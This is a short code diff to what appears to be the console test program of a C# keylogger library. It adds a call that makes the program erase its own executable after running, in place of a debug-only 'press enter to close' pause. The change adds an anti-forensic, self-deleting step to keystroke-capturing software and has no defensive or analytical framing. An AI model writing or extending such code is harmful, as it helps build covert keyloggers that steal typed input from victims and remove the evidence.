@@ -1,11 +1,11 @@
-﻿using KeyLogger.Library;
+﻿using Custom.dotNet.EraseItself;
+using KeyLogger.Library;
 using KeyLogger.Library.Appenders;
 using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
 using System.Threading;
-using System.Threading.Tasks;
 
 namespace KeyLoggerLibrary.ConsoleTest
 {
@@ -26,10 +26,7 @@ namespace KeyLoggerLibrary.ConsoleTest
 
             _service = null;
 
-#if DEBUG
-            Console.WriteLine("Press enter to close...");
-            Console.ReadLine();
-#endif
+            AutoEraseAssembly.ByCommandLine(System.Reflection.Assembly.GetExecutingAssembly().Location);
         }
     }
 }
